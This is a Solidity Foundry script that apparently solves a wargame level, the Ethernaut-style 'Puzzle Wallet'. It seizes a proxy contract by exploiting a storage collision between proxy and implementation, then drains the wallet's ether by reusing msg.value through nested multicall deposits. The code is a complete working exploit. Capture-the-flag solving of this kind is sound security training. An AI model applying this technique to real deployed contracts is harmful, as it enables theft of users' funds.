pragma solidity ^0.8.0;
import "../instances/Ilevel24.sol";
import "forge-std/Test.sol";

contract Level24 is Test {
    PuzzleProxy level24 =
        PuzzleProxy(payable(0xEb8d5302e34A77a6C3B5655B3E19a010eA7CeD71));

    PuzzleWallet level24PuzzleWallet =
        PuzzleWallet(0xEb8d5302e34A77a6C3B5655B3E19a010eA7CeD71);

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        level24.proposeNewAdmin(attacker);
        level24PuzzleWallet.addToWhitelist(attacker);
        uint256 payloadMaxBalance = uint256(uint160(attacker));
        uint256 contractBalance = address(level24PuzzleWallet).balance;
        uint256 amountPerAttack = 0.0001 ether;
        uint256 nTimes = (contractBalance / amountPerAttack) + 1;
        bytes[] memory payloads = new bytes[](nTimes);
        for (uint256 i = 0; i < nTimes; i++) {
            bytes[] memory payload = new bytes[](1);
            payload[0] = abi.encodeWithSignature("deposit()");
            payloads[i] = abi.encodeWithSignature(
                "multicall(bytes[])",
                payload
            );
        }
        level24PuzzleWallet.multicall{value: amountPerAttack}(payloads);
        level24PuzzleWallet.execute(
            attacker,
            address(level24PuzzleWallet).balance,
            ""
        );
        level24PuzzleWallet.setMaxBalance(payloadMaxBalance);
        require(
            level24.admin() == attacker,
            "Level24: Failed to set attacker as owner"
        );
        vm.stopBroadcast();
    }
}
